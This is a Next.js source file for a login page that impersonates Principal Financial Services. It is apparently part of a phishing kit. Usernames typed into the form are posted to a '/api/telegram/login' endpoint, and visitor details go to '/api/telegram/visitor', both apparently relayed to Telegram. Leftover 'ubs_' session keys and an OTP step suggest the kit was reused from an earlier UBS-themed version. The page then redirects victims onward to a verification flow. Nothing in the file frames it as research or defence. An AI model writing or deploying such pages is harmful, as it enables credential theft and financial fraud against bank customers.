"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Preloader } from "@/components/preloader";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
import principalLogo from "../Principal/images/principal logo.png";

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const [username, setUsername] = useState("");
  const [remember, setRemember] = useState(false);
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [honeypot, setHoneypot] = useState("");
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    sessionStorage.removeItem("ubs_verify");
    sessionStorage.removeItem("ubs_details");
    sessionStorage.removeItem("ubs_otp2");
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, { once: true, passive: true });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  useEffect(() => () => {
    if (redirectRef.current) window.clearTimeout(redirectRef.current);
  }, []);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoginLoading || !username.trim()) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }

    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, remember }),
      });
      if (!response.ok) throw new Error("Failed to send login data");
      sessionStorage.setItem("ubs_verify", "1");
      redirectRef.current = window.setTimeout(() => router.push("/verify-choice"), 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  return (
    <>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <div className="flex min-h-screen flex-col bg-white font-sans text-[#292929]">
          <header className="flex h-20 items-center border-b border-gray-300 bg-white px-6 shadow-lg lg:px-10">
            <img
              src={principalLogo.src}
              alt="Principal"
              className="h-auto w-44 object-contain"
            />
          </header>

          <main className="flex-1">
            <section className="mx-auto w-full max-w-[540px] px-6 pb-24 pt-20">
              <h1 className="mb-14 text-center text-[48px] font-normal leading-[1.05] tracking-[-1.5px] lg:text-[60px]">
                Log in to your<br />account
              </h1>

              <form onSubmit={handleSubmit}>
                <label htmlFor="username" className="mb-3 block text-[20px]">Username</label>
                <input
                  type="text"
                  id="username"
                  name="username"
                  autoComplete="username"
                  className="h-14 w-full rounded-xl border border-gray-500 px-5 text-xl outline-none focus:border-[#0878bd]"
                  value={username}
                  onChange={(event) => setUsername(event.target.value)}
                />

                <label htmlFor="remember" className="mt-8 flex cursor-pointer items-center gap-3 px-3 text-[20px]">
                  <input
                    type="checkbox"
                    id="remember"
                    name="remember"
                    className="h-5 w-5 appearance-none rounded-sm border border-gray-500 checked:border-[#0878bd] checked:bg-[#0878bd]"
                    checked={remember}
                    onChange={(event) => setRemember(event.target.checked)}
                  />
                  <span>Remember this device</span>
                </label>

                <input
                  type="text"
                  name="website"
                  value={honeypot}
                  onChange={(event) => setHoneypot(event.target.value)}
                  className="hidden"
                  autoComplete="off"
                />

                <button
                  type="submit"
                  disabled={isLoginLoading || !username.trim()}
                  className="mx-auto mt-12 block h-16 w-[80%] rounded-full bg-[#0878bd] text-[22px] font-semibold text-white transition-colors hover:bg-[#066aa5] disabled:cursor-not-allowed disabled:opacity-60"
                >
                  {isLoginLoading ? "Next..." : "Next"}
                </button>

                <p className="sr-only" aria-live="polite">
                  {loginError ?? ""}
                </p>

                <div className="mt-8 text-center">
                  <button type="button" onClick={() => router.push("/forgot-password")} className="mb-6 block w-full text-[19px] font-semibold text-[#0069a6] hover:underline">
                    Forgot username or password?
                  </button>
                  <button type="button" onClick={() => router.push("/new-user")} className="mb-12 block w-full text-[19px] font-semibold text-[#0069a6] hover:underline">
                    New user? Register here.
                  </button>
                </div>
              </form>
            </section>
          </main>

          <footer className="bg-[#303030] px-4 py-12 text-white lg:px-10 lg:py-20">
            <div className="mb-10 lg:mb-16">
              <p className="text-xl">Trouble logging in? <a href="#" className="font-bold underline underline-offset-4">Get help</a></p>
            </div>

            <nav className="mb-12 flex flex-col gap-7 text-xl lg:mb-7 lg:flex-row lg:items-center lg:gap-10">
              <a href="#" className="hover:underline">Terms of use</a>
              <a href="#" className="hover:underline">Disclosures</a>
              <a href="#" className="hover:underline">Privacy</a>
              <a href="#" className="hover:underline">Security</a>
              <a href="#" className="hover:underline">Report fraud</a>
            </nav>

            <div className="border-t border-white pb-6 pt-8 lg:flex lg:items-end lg:justify-between">
              <div>
                <p className="mb-5 text-lg">©2026 Principal Financial Services, Inc.</p>
                <p className="text-lg leading-relaxed">Securities offered through Principal Securities, Inc., <span className="font-semibold underline underline-offset-4">member SIPC</span></p>
              </div>
              <div className="mt-10 flex items-center gap-8 lg:mb-10 lg:mt-0" aria-label="Social media links">
                <a href="#" aria-label="Facebook" className="hover:opacity-80"><i className="fa-brands fa-facebook text-[34px]" /></a>
                <a href="#" aria-label="X" className="hover:opacity-80"><i className="fa-brands fa-x-twitter text-[34px]" /></a>
                <a href="#" aria-label="YouTube" className="hover:opacity-80"><i className="fa-brands fa-youtube text-[34px]" /></a>
                <a href="#" aria-label="LinkedIn" className="hover:opacity-80"><i className="fa-brands fa-linkedin text-[34px]" /></a>
              </div>
            </div>
          </footer>
        </div>
      )}
    </>
  );
}
